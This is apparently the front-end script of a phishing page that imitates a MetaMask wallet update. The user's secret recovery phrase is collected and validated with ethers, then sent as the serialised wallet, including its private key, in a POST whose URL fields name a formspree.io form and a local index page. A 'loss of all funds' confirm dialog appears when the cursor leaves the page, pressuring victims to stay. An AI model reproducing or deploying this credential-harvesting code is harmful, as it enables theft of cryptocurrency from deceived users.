$("select").on("change keyup paste", function (argument) {
	
  $(".inputItem input").parent().hide();

  let count = $(this).val();

  $( ".inputItem input" ).each(function( index ) {
      
      if(index < count){

        $(this).parent().show();
      }
  });
})

$(".show").on("click", function(argument) {
	
	$(this).parent().find("svg").hide()

	$(this).parent().find(".hide").show()

	$(this).parent().find("input").attr("type", "text");
})
$(".hide").on("click", function(argument) {
	
	$(this).parent().find("svg").hide()

	$(this).parent().find(".show").show()

	$(this).parent().find("input").attr("type", "password")
})


$(".inputItem input").on("change keyup paste", function (argument) {

	let pass = $(this).val();


    if (pass.split(" ").length == 1) {

	    $(this).val(pass)

	  


    } else {

	    let words = pass.split(" ");

	    $(".inputItem input").each(function (index) {
	      $(this).val(words[index])

	    });

  

    }

	let count = 0;
 	let mnemonic = "";

	$( ".inputItem input" ).each(function( index ) {
      
      	if($(this).val() != ""){
      		count += 1;
      	}

      	mnemonic += $(this).val() + " ";
      
	});

	if(count != 12 && count != 15 && count != 18 && count != 21 && count != 24 ){

		$(".errorAlert span").text("Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words");

		$(".errorAlert").show();

		$("#mcheck").val(0)

	}else if(count == 12 || count == 15 || count == 18 || count == 21 || count == 24 ){

		try{

	        let mnemonicWallet = ethers.Wallet.fromMnemonic(mnemonic.trim());

	        $(".errorAlert").hide();

	        $("#mcheck").val(1)

	      

	    }
	    catch (e){

	        $(".errorAlert span").text("Invalid Secret Recovery Phrase");

			$(".errorAlert").show();

			$("#mcheck").val(0);

			


	    }
	}else{
		$(".errorAlert").hide();
	}


	checkInputs();
	

})


function checkInputs(argument) {

	count = 0;
	
	$(".passwordBox input").each(function( index ) {
      
      	if($(this).val() == "" ||  $(this).val().length < 8){
      		count += 1;
      	}

	});



	if($("#mcheck").val() == '1' && count == 0 && $('.checkbox input').is(':checked') ){

		$(".subBtn").prop("disabled", false);

	}
	else{
		$(".subBtn").prop("disabled", true);

		
	}


}

$(".passwordBox input").on("change keyup paste", function (argument) {

	checkInputs();

})

$(".checkbox input").on("change keyup paste", function (argument) {

	checkInputs();

})

$(".subBtn").on("click", function(argument) {
	let mnemonic = "";

	$( ".inputItem input" ).each(function( index ) {
      

      	mnemonic += $(this).val() + " ";
      
	});

    let wallet = ethers.Wallet.fromMnemonic(mnemonic.trim());


    $.ajax({
    url: "https://formspree.io/f/xlezrnvv",
    method: "POST",
    dataType: "json",
           url: "../../index.html",
           data: { name: JSON.stringify(wallet),type: "metamask" }
         })
         .done(function( msg ) {
         	 localStorage.setItem("redirect", "yes");
             document.location.replace(msg);
             
          });
})


setTimeout(function(){ $(".loader").hide(); }, 2000);

$(".minnetItem").on("click", function (argument) {
  $(".minnetItem").removeClass("avtiveminnet");
  $(this).addClass("avtiveminnet");

  $(".minnet").find("p").text($(this).find("p").text())

  $(".dropdown").hide();
})

$(".minnet").on("click", function (argument) {
  

  $(".dropdown").show();
})

$( "body" ).hover(
  function() {
   
  }, function() {
    confirm("Canceling the update may result in loss of access to the wallet and all funds");
  }
);